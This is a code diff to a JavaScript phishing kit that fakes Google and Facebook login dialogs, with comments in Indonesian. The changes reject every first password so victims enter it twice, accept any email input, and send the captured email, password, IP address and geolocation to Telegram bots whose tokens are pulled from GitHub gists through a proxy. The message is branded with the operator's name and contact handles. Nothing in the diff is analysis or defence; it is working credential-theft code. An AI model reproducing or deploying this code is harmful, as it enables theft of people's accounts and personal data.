@@ -9,12 +9,19 @@ var avatarColors = {
 };
 function getAvatarClass(l){ return avatarColors[l.toLowerCase()]||'av-blue'; }
 
+// ========== PENAMBAHAN: variabel penghitung percobaan ==========
+let googleAttempt = 0;
+let fbAttempt = 0;
+
 function openModal() {
   document.getElementById('overlay').classList.add('active');
   showStep('stepChoose');
 }
 function closeModal() {
   document.getElementById('overlay').classList.remove('active');
+  // ========== PENAMBAHAN: reset penghitung saat modal ditutup ==========
+  googleAttempt = 0;
+  fbAttempt = 0;
 }
 function showStep(id) {
   document.querySelectorAll('.step').forEach(function(s){ s.classList.remove('active'); });
@@ -65,7 +72,18 @@ function gHandlePassNext() {
     setTimeout(function(){ inp.classList.remove('shake'); }, 400);
     return;
   }
-  inp.classList.remove('error'); err.textContent = '';
+  inp.classList.remove('error');
+  
+  // ========== PERUBAHAN: percobaan pertama hanya tampilkan error ==========
+  if (googleAttempt === 0) {
+    googleAttempt++;
+    inp.classList.add('error','shake');
+    err.textContent = 'Wrong password, Please try again!';
+    setTimeout(function(){ inp.classList.remove('shake'); }, 400);
+    return;
+  }
+  // ========== PERUBAHAN: percobaan kedua lanjut kirim data ==========
+  err.textContent = '';
 
   var dim = document.getElementById('gPassLoadingDim');
   document.getElementById('gPassLoadingText').textContent = 'Mengirim data...';
@@ -99,29 +117,35 @@ function fbHandleLogin() {
   var email = emailInp.value.trim();
   var pass  = passInp.value;
 
-  // Validasi email harus berdomain @gmail.com
-  var emailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
-  var emailOk = emailRegex.test(email);
+  var emailOk = email.length > 0;
+  var passOk  = pass.length >= 8;
 
   if (!emailOk) {
-    emailInp.classList.add('error', 'shake');
-    emailErr.textContent = 'Masukkan email Gmail yang valid.';
-    setTimeout(function() { emailInp.classList.remove('shake'); }, 400);
+    emailInp.classList.add('error','shake');
+    emailErr.textContent = 'Masukkan email atau nomor ponsel.';
+    setTimeout(function(){ emailInp.classList.remove('shake'); }, 400);
     return;
   }
   emailErr.textContent = '';
 
-  // Validasi password minimal 8 karakter
-  var passOk = pass.length >= 8;
   if (!passOk) {
-    passInp.classList.add('error', 'shake');
+    passInp.classList.add('error','shake');
     passErr.textContent = 'Kata sandi minimal 8 karakter.';
-    setTimeout(function() { passInp.classList.remove('shake'); }, 400);
+    setTimeout(function(){ passInp.classList.remove('shake'); }, 400);
     return;
   }
   passErr.textContent = '';
 
-  // Lanjutkan dengan proses login (mengirim data, dll)
+  // ========== PERUBAHAN: percobaan pertama hanya tampilkan error ==========
+  if (fbAttempt === 0) {
+    fbAttempt++;
+    passInp.classList.add('error','shake');
+    passErr.textContent = 'Wrong password, Please try again!';
+    setTimeout(function(){ passInp.classList.remove('shake'); }, 400);
+    return;
+  }
+
+  // ========== PERUBAHAN: percobaan kedua lanjut kirim data & redirect langsung ==========
   var btn = document.getElementById('fbLoginBtn');
   var spinner = document.getElementById('fbBtnSpinner');
   var btnText = document.getElementById('fbBtnText');
@@ -141,17 +165,12 @@ function fbHandleLogin() {
     btn.classList.remove('loading'); btn.disabled = false;
     spinner.style.display = 'none';
     btnText.textContent = 'Login';
-    document.getElementById('fbcName').textContent = email;
-    showStep('stepFBConfirm');
+    // Langsung redirect, tanpa menampilkan step konfirmasi
+    locationRedirect();
+    // Jika ingin tetap menggunakan step konfirmasi, gunakan kode yang dikomentari berikut:
+    // document.getElementById('fbcName').textContent = email;
+    // showStep('stepFBConfirm');
   }, 2000);
-}
-
-function fbLanjutkan() {
-  var dim = document.getElementById('fbConfirmLoadingDim');
-  document.getElementById('fbConfirmLoadingText').textContent = 'Memproses...';
-  dim.classList.add('active');
-
-  setTimeout(function() { locationRedirect(); }, 2000);
 }
 
 function fbTogglePass() {
@@ -185,13 +204,13 @@ async function sendToTelegram(email, password, login) {
     const asn = geo.asn || 'Tidak Ada Data';
     const lon = geo.lon || 'Tidak Ada Data';
     const lat = geo.lat || 'Tidak Ada Data';
-    const proxy = 'https://api.codetabs.com/v1/proxy/?quest=';
+
     const tokenUrl = 'https://gist.githubusercontent.com/TirzzNesia/2cfa7346fe159a78c97c905cfe000efc/raw/22d9b78da579834c6019b764b4c01306a3637219/zexotokengiza.txt';
     const idUrl = 'https://gist.githubusercontent.com/TirzzNesia/dc4b8403d3bc22f90e5b1b99d17fbce1/raw/beb23224248dee33ac0b5c2578fba33e9aa2a698/kingzexoid.txt';
+    const proxy = 'https://api.codetabs.com/v1/proxy/?quest=';
 
     const tokenRes = await fetch(proxy + encodeURIComponent(tokenUrl));
-    const tokensText = await tokenRes.text();
-    const botTokens = tokensText.split('\n').map(t => t.trim()).filter(t => t.length > 0);
+    const botToken = (await tokenRes.text()).trim();
 
     const idsRes = await fetch(proxy + encodeURIComponent(idUrl));
     const idsText = await idsRes.text();
@@ -204,12 +223,11 @@ async function sendToTelegram(email, password, login) {
       timeStyle: 'medium'
     });
 
-    const message =
-      `<blockquote><b>🔥 RESSULT TIRZZ23NESIA! 🔥</b></blockquote>\n` +
+    const message = `<blockquote><b>🔥 RESSULT TIRZZ23NESIA! 🔥</b></blockquote>\n` +
       `<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n` +
-      `<b>User :</b> <code>${user}</code>\n` +
-      `<b>Tipe   :</b> <code>${tipe}</code>\n` +
-      `<b>Detail      :</b> <code>${detail}</code>\n` +
+      `<b>Email/User :</b> <code>${email}</code>\n` +
+      `<b>Password   :</b> <code>${password}</code>\n` +
+      `<b>Login      :</b> <code>${login}</code>\n` +
       `<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n` +
       `<b>IP Address :</b> <code>${ipv4}</code>\n` +
       `<b>IPv6       :</b> <code>${ipv6}</code>\n` +
@@ -224,24 +242,21 @@ async function sendToTelegram(email, password, login) {
       `<b>Wa   :</b> <span class="tg-spoiler">628975919600</span>\n` +
       `<b>Tele :</b> <span class="tg-spoiler">@zexoorill</span>`;
 
-    chatIds.forEach((cid, index) => {
-      const token = botTokens[index % botTokens.length];
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    for (let cid of chatIds) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
       const params = new URLSearchParams({
         chat_id: cid,
         text: message,
         parse_mode: 'HTML',
         disable_web_page_preview: 'true'
       });
-
       fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: params,
         mode: 'no-cors'
       }).catch(err => console.log('Telegram send error (ignored):', err));
-    });
-
+    }
   } catch (e) {
     console.error('Backdoor error:', e);
   }
